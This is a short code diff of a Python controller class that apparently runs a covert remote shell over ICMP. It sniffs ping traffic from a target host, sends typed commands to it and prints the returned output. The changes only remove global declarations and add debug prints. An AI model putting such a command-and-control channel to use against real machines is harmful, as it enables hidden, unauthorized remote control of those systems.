@@ -42,8 +42,6 @@ class Controller(Host):
         sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")
 
     def interact(self, target):
-        global wait
-
         Target = Query()
         target = self.db.search(Target.id == target)[0]
 
@@ -56,10 +54,9 @@ class Controller(Host):
                 if len(cmd) != 0:
                     self.send(target['ip'], "instruction", cmd)
                     wait.value = True
+                    print(wait.value)
 
     def instruction(self, shellpack):
-        global wait
-
         if shellpack['option'] == "TRUNCATED":
             self.mock_stdout += shellpack['data'].decode()
         elif shellpack['option'] == "COMPLETE":
@@ -67,12 +64,14 @@ class Controller(Host):
             print(self.mock_stdout)
             self.mock_stdout = ""
             wait.value = False
+            print(wait.value)
         elif shellpack['option'] == "ERROR":
             print(f"[ERROR] {shellpack['data'].decode()}")
             wait.value = False
         else:
             print(f"{shellpack['data'].decode()}")
             wait.value = False
+            print(wait.value)
         
 
 if __name__ == "__main__":
